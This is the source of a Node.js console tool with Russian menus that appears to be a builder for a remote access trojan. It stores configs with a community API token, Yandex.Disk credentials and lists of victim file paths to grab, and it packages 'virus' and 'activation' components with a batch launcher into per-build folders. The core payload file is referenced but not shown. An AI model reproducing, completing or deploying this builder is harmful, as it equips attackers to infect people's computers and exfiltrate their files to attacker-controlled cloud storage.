const fs = require("fs-extra")
const stdio = require("stdio")
const { exit } = require("process")
const { constants } = require("buffer")

var configsobj = {
    configsfolderpath: `${__dirname}\\configs`,
    configs: {
        paths: [],
        names: [],
        localnames: []
    }
}

var langsobj = {
    langsfolderpath: `${__dirname}\\translations`,
    langs: {
        paths: [],
        names: [],
        localnames: [],
        translations: []
    },
    nowlagnint: 0
}
var nowlang

const debugmode = process.argv[2]

var menu = {}
menu.clearscreen = function () {
    if (debugmode != "-debug") {
        console.clear()
    }
}

menu.mainmenu = function () {
    menu.clearscreen()
    return new Promise(function () {
        console.log(nowlang.mainmenu.top)
        stdio.ask("1. Управление конфигами\n2. Управление ратниками\n3. Смена языка\n4. Перезагрузка\nВвод").then(mainmenuanswer => {
            let inp = parseInt(mainmenuanswer, 10)
            if (inp == 1) {//
                menu.configsmenu().then(() => {
                    menu.init()
                })
            } else if (inp == 2) {
                menu.ratmenu().then(() => {
                    menu.init()
                })
            } else if (inp == 3) {
                menu.changelang().then(() => {
                    menu.init()
                })
            } else {
                menu.init()
            }
        })
    })
}
//Lang
menu.changelang = function () {
    menu.clearscreen()
    return new Promise(function (resolve) {
        console.log("==================\nСМЕНА ЯЗЫКОВ\n==================")
        console.log(`ТЕКУЩИЙ ЯЗЫК => ${langsobj.langs.localnames[langsobj.nowlagnint]}\n==================`)
        new Promise(function (resolve) {
            if(langsobj.langs.paths.length != 0){
                for (let index = 0; index < langsobj.langs.paths.length; index++) {
                    console.log(`${index + 1}. ( ${langsobj.langs.localnames[index]} ) --> ${langsobj.langs.paths[index]}`)
                    //console.log(`${configsobj.configs.paths.length-1 == index}     |   ${configsobj.configs.paths.length}  |   ${index}`)
                    if (langsobj.langs.paths.length - 1 == index) {
                        resolve(true)
                    }
                }
            } else {
                console.log("Языков не обнаружено")
                resolve(true)
            }
        }).then(()=>{
            console.log("==================")
            stdio.ask("Введите порядковый номер").then((answ)=>{
                let temp = parseInt(answ, 10)
                langsobj.nowlagnint = temp - 1
                nowlang = langsobj.langs.translations[langsobj.nowlagnint]
                let data = `{"localname": "${langsobj.langs.localnames[langsobj.nowlagnint]}"}`
                fs.exists(__dirname+"\\translations\\selected.json",(exist) =>{
                    if(exist){
                        fs.remove(__dirname+"\\translations\\selected.json").then(()=>{
                            fs.writeFile(__dirname+"\\translations\\selected.json",data ,(err) =>{
                                menu.init()
                            })
                        })
                    } else {
                        fs.writeFile(__dirname+"\\translations\\selected.json",data ,(err) =>{
                            menu.init()
                        })
                    }
                })
            }) 
        })
    })
}

// Configs
menu.configsprint = function () {
    return new Promise(function (resolve) {
        if(configsobj.configs.paths.length != 0){
            for (let index = 0; index < configsobj.configs.paths.length; index++) {
                console.log(`${index + 1}. ${configsobj.configs.names[index]} ( ${configsobj.configs.localnames[index]} ) --> ${configsobj.configs.paths[index]}`)
                //console.log(`${configsobj.configs.paths.length-1 == index}     |   ${configsobj.configs.paths.length}  |   ${index}`)
                if (configsobj.configs.paths.length - 1 == index) {
                    resolve(true)
                }
            }
        } else {
            console.log("Конфигов не обнаружено")
            resolve(true)
        }
    })
}
menu.configsmenu = function () {
    menu.clearscreen()
    //console.clear()
    console.log("======================\n|УПРАВЛЕНИЕ КОНФИГАМИ|\n======================")
    return new Promise(function (resolve) {
        menu.configsprint().then(resofprint => {
            console.log("======================")
            stdio.ask("1. Создать конфиг\n2. Удалить конфиг\n3. Скопировать конфиг\n4. Назад в главное меню\nВвод").then((answer) => {
                let intanswer = parseInt(answer, 10)
                if (intanswer == 1) {
                    menu.configcreate().then(() => {
                        menu.init()
                    })
                } else if (intanswer == 2) {

                } else if (intanswer == 3) {

                } else if (intanswer == 4) {
                    menu.init()
                } else {
                    menu.init()
                }
            })
        })
    })
}
menu.configcreate = function () {
    menu.clearscreen()
    return new Promise(function () {
        console.log("======================\n|==СОЗДАНИЕ КОНФИГА==|\n======================")
        stdio.ask("Введите название вашего конфига").then((configname) => {
            stdio.ask("Введите доп. информацию для вашего конфига").then((localname) => {
                stdio.ask("Введите ключ сообщества").then((token) => {
                    stdio.ask("Введите ID сообщества").then((groupid) => {
                        let intgroupid = parseInt(groupid, 10)
                        stdio.ask("Введите логин от Yandex.Disk").then((YandexLogin) => {
                            stdio.ask("Введите пароль от Yandex.Disk").then((YandexPassword) => {
                                stdio.ask("Желаете ли вы, использовать базу данных с известными файлами? (Да\\Нет)").then((useDataBase) => {
                                    let finalconfig = { files: [], group: {}, localname: "",yandex: {} }
                                    finalconfig.localname = localname; finalconfig.group.token = token; finalconfig.group.id = intgroupid;finalconfig.yandex.login = YandexLogin;finalconfig.yandex.password = YandexPassword
                                    new Promise(function (resolve) {
                                        console.log("Теперь вы должны ввести путь к файлам \\ папкам \nПример - (C://myfolder/myfile.txt || %AppData%/../local/myfolder || )\nЕсли вы захотите закончить ввод файлов, то введите 0")
                                        if (useDataBase == "Да" || useDataBase == "да" || useDataBase == "Y" || useDataBase == "y" || useDataBase == "Yes" || useDataBase == "yes") {
                                            finalconfig.files = require("./database.json")
                                        }
                                        function addpathtoconfig() {
                                            return new Promise(function (resolve) {
                                                stdio.ask("").then((a) => {
                                                    if (a == "0") {
                                                        resolve(true)
                                                    } else {
                                                        finalconfig.files[finalconfig.files.length] = a
                                                        console.log(finalconfig.files)
                                                        addpathtoconfig().then(() => { resolve(true); })
                                                    }
                                                })
                                            })
                                        }
                                        addpathtoconfig().then(() => {
                                            resolve(true)
                                        })
                                    }).then(() => {
                                        console.log("Создаём конфиг...")
                                        finalconfig = JSON.stringify(finalconfig)
                                        fs.writeFile(`./configs/${configname}.json`, finalconfig, (err) => {
                                            if (err) {
                                                console.error(err)
                                            }
                                            menu.init()
                                        })
                                    })
                                    //stdio.ask("").then((a)=>{
                                    //    
                                    //})
                                })
                            })
                        })
                    })
                })
            })
        })
    })
}
menu.configdelete = function () { // not ready
    
}
menu.configcopy = function () { // not ready
    
}
// Rats
menu.ratdeleting = function () { // not ready
    return new Promise(function (resolve) {
        
    })
}
menu.ratcreating = function () {
    menu.clearscreen()

    return new Promise(function (resolve) {
        console.log("\n======================\n|==СОЗДАНИЕ РАТНИКА==|\n======================")
        menu.configsprint().then(() => {
            console.log("======================")


            stdio.ask("Выберите конфиг, введя его порядковый номер").then(selectedconfig => {
                let intselectedconfig = parseInt(selectedconfig, 10)
                //console.log(`\n${typeof (intselectedconfig)} |   ${typeof (selectedconfig)}`)

                stdio.ask("Введите название вашего ратника (на английском, без использования спец. символов)").then(ratfilename => {

                    fs.readFile(`${__dirname}\\ratresources\\ratvirus\\ratcore.js`, 'utf8', function (err, contents) {
                        if (!err) {
                            fs.exists(`${__dirname}\\ratexes`, existratsfolder => {
                                if (!existratsfolder) {
                                    fs.mkdir(`${__dirname}\\ratexes`, err => {
                                        if (err) {
                                            console.error(err)
                                        }
                                    })

                                }
                                fs.mkdir(`${__dirname}\\ratexes\\${ratfilename}`, err => {
                                    fs.mkdir(`${__dirname}\\ratexes\\${ratfilename}\\virus`, err => {
                                        fs.mkdir(`${__dirname}\\ratexes\\${ratfilename}\\activation`, err => {
                                            // СОЗДАНО, ПЕРЕЙДИТЕ К АКТИВАЦИИ

                                            fs.copy('./ratresources/ratactivation/node_modules', `${__dirname}\\ratexes\\${ratfilename}\\activation\\node_modules`, (err) => {
                                                if (err) {
                                                    console.error("1" + err);
                                                } else {

                                                }
                                            });
                                            fs.copy('./ratresources/ratactivation/ratactivationcore.js', `${__dirname}\\ratexes\\${ratfilename}\\activation\\ratactivationcore.js`, function (err) {
                                                if (err) {
                                                    console.error("2" + err);
                                                } else {

                                                }
                                            });
                                            fs.copy('./ratresources/ratactivation/start.bat', `${__dirname}\\ratexes\\${ratfilename}\\activation\\start.bat`, function (err) {
                                                if (err) {
                                                    console.error("3" + err);
                                                } else {

                                                }
                                            });
                                            fs.copy(`${configsobj.configs.paths[intselectedconfig - 1]}`, `${__dirname}\\ratexes\\${ratfilename}\\activation\\config.json`, function (err) {
                                                if (err) {
                                                    console.error(`${configsobj.configs.paths[intselectedconfig]}`);
                                                } else {

                                                }
                                            });
                                            fs.copy(`./ratresources/ratvirus/node_modules`, `${__dirname}\\ratexes\\${ratfilename}\\virus\\node_modules`, function (err) {
                                                if (err) {
                                                    console.error(`${configsobj.configs.paths[intselectedconfig]}`);
                                                } else {

                                                }
                                            });
                                            resolve()
                                        })
                                    })
                                })
                            })
                        } else {

                        }
                    });

                })
            })
        })
    })
}
menu.ratmenu = function () {
    menu.clearscreen()
    return new Promise(function () {
        console.log("===============\n|МЕНЮ РАТНИКОВ|\n===============")
        stdio.ask("1. Создать ратник\n2. Удалить ратник\n3. Назад в главное меню\nВвод").then(answer => {
            let intanswer = parseInt(answer, 10)

            if (intanswer == 1) {
                menu.ratcreating().then(() => {
                    menu.init()
                })
            } else if (intanswer == 2) {
                menu.ratdeleting().then(() => {
                    menu.init()
                })
            } else {
                menu.init()
            }
        })
    })
}

// Sys
menu.reloadlangs = function () {
    return new Promise(function (resolve, reject) {
        fs.readdir(langsobj.langsfolderpath, (err, files) => {
            new Promise(function (resolve, reject) {
                if (files.length == 0) {
                    resolve(true)
                } else {
                    langsobj.langs.paths = []
                    langsobj.langs.names = []
                    fs.exists(__dirname+"\\translations\\selected.json", (IsHereSelectedLang) =>{
                        let filestotal = files.length
                        if (IsHereSelectedLang) {
                            filestotal--
                        }
                        for (let index = 0; index < files.length; index++) {
                            console.log(`lol kek ${index} is ${index >= files.length - 1}`)
                            let lastchar = files[index].split(".")
                            fs.stat(`${langsobj.langsfolderpath}/${files[index]}`, (err, stats) => {
                                if (stats.isFile() == true) {
                                    if (lastchar[lastchar.length - 1] == "json" && lastchar[0] != "selected") {
                                        langsobj.langs.paths[langsobj.langs.paths.length] = `${langsobj.langsfolderpath}/${files[index]}`
                                        let conf = require(`${langsobj.langs.paths[langsobj.langs.paths.length - 1]}`)
                                        langsobj.langs.localnames[langsobj.langs.names.length] = conf.localname
                                        langsobj.langs.names[langsobj.langs.names.length] = lastchar[0]
                                        langsobj.langs.translations[langsobj.langs.translations.length] = conf.translation
                                        
                                        if (!IsHereSelectedLang) {
                                            if (conf.localname == "Русский") {
                                                langsobj.nowlagnint = langsobj.langs.paths.length - 1
                                                console.log(`${langsobj.langs.translations[langsobj.nowlagnint]} Установлен язык Русский`)
                                                nowlang = langsobj.langs.translations[langsobj.nowlagnint]
                                            }
                                        } else {
                                            let selectedlang = require(__dirname+"\\translations\\selected.json")
                                            console.log(conf.localname == selectedlang.localname)
                                            if (conf.localname == selectedlang.localname) {
                                                langsobj.nowlagnint = langsobj.langs.paths.length - 1
                                                console.log(`${langsobj.langs.translations[langsobj.nowlagnint]} Установлен язык ${selectedlang.localname}  SELECTED`)
                                                nowlang = langsobj.langs.translations[langsobj.nowlagnint]
                                            }
                                        }
                                    } else {
                                        if (index >= files.length - 1) {
                                            resolve(true)
                                        }
                                    }
                                } else {
                                    if (index >= files.length - 1) {
                                        resolve(true)
                                    }
                                }
                            })
                        }         
                    })
                    
                }

            }).then(result => {
                resolve(true)
            })
        })
    })
}
menu.reloadconfigs = function () {
    return new Promise(function (resolve, reject) {
        fs.readdir(configsobj.configsfolderpath, (err, files) => {
            new Promise(function (resolve, reject) {
                if (files.length == 0) {
                    resolve(true)
                } else {
                    configsobj.configs.paths = []
                    configsobj.configs.names = []
                    for (let index = 0; index < files.length; index++) {
                        fs.stat(`${configsobj.configsfolderpath}/${files[index]}`, (err, stats) => {
                            if (stats.isFile() == true) {
                                let lastchar = files[index].split(".")
                                if (lastchar[lastchar.length - 1] == "json") {
                                    configsobj.configs.paths[configsobj.configs.paths.length] = `${configsobj.configsfolderpath}/${files[index]}`
                                    let conf = require(`${configsobj.configs.paths[configsobj.configs.paths.length - 1]}`)
                                    configsobj.configs.localnames[configsobj.configs.names.length] = conf.localname
                                    configsobj.configs.names[configsobj.configs.names.length] = lastchar[0]
                                    if (index >= files.length - 1) {
                                        resolve(true)
                                    }
                                } else {
                                    if (index >= files.length - 1) {
                                        resolve(true)
                                    }
                                }
                            } else {
                                if (index >= files.length - 1) {
                                    resolve(true)
                                }
                            }
                        })
                    }
                }

            }).then(result => {
                resolve(true)
            })
        })
    })
}
menu.init = function () {
    menu.reloadconfigs().then(isGoodScanned => {
        if (isGoodScanned) {
            fs.exists(langsobj.langsfolderpath, isHereLangsFolder =>{
                if (isHereLangsFolder) {
                    menu.reloadlangs().then((ans)=>{
                        if (ans) {
                            menu.mainmenu()
                        }
                    })
                }
            })
        } else {

        }
    })
}
fs.exists(configsobj.configsfolderpath, isHereConfigsFolder => {
    if (isHereConfigsFolder) {
        menu.init()
    } else {
        console.log("Отсутвует папка configs... " + __dirname)
        fs.mkdir(configsobj.configsfolderpath, err => {
            if (err) {

            } else {
                console.log("Программа создала папку configs...")
                menu.init()
            }
        })
    }
})